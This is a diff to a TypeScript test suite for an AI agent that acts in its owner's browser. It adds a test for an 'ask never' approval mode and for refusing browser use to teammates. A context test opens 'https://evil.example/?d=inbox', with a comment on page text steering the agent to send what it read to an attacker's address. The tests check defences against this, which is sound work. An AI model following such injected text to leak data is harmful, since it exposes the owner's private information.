@@ -60,7 +60,7 @@ function fakeSlack() {
   return { calls, posts, bot: client('bot'), user: client('owner') }
 }
 
-function setup(o: { noHook?: boolean; settings?: { set(key: string, value: unknown): void }; hubDown?: boolean; dir?: string; kagelet?: string; dreaming?: string; dbRead?: { command: () => string | undefined; maxRows: number; timeoutMs?: number }; approve?: (tool: string, description: string, input: Record<string, unknown>) => Promise<boolean>; browser?: { call(op: string, args: Record<string, unknown>): Promise<unknown>; block: string[] }; meetbot?: { join(link: string): string } } = {}) {
+function setup(o: { noHook?: boolean; settings?: { set(key: string, value: unknown): void }; hubDown?: boolean; dir?: string; kagelet?: string; dreaming?: string; dbRead?: { command: () => string | undefined; maxRows: number; timeoutMs?: number }; approve?: (tool: string, description: string, input: Record<string, unknown>) => Promise<boolean>; browser?: { call(op: string, args: Record<string, unknown>): Promise<unknown>; block: string[]; ask?: 'major' | 'never' }; meetbot?: { join(link: string): string } } = {}) {
   const slack = fakeSlack()
   const dir = o.dir ?? mkdtempSync(join(tmpdir(), 'kage-tools-'))
   const ledgers = openLedgers(dir)
@@ -1039,6 +1039,18 @@ describe("acting in the owner's browser", () => {
     // A site no tab is on asks first: page text could steer Kage to an address that carries what it read.
     await s.call('browser_act', { ...at, action: 'open', url: 'https://evil.example/?d=inbox' })
     assert.equal(cards.length, 1)
+  })
+  test("with ask 'never' the owner's task is the yes: a major step runs with no card, and a teammate still gets no browser", async () => {
+    const asked: string[] = [], cards: string[] = []
+    const s = setup({ browser: { ...chrome({ asked }), ask: 'never' }, approve: asking(true, cards) })
+    s.t.onTask(s.task())
+    const r = await s.call('browser_act', { ...at, action: 'click', ref: 2 })
+    assert.equal(r.isError, undefined, r.text)
+    assert.deepEqual(cards, [])
+    assert.ok(asked.includes('click'))
+    const t = setup({ browser: { ...chrome({}), ask: 'never' }, approve: asking(true, cards) })
+    t.t.onTask(t.task({ fromOwner: false }))
+    assert.equal((await t.call('browser_act', { ...at, action: 'click', ref: 2 })).isError, true)
   })
   test('with no way to ask the owner, an everyday step still runs and a major one is refused', async () => {
     const asked: string[] = []
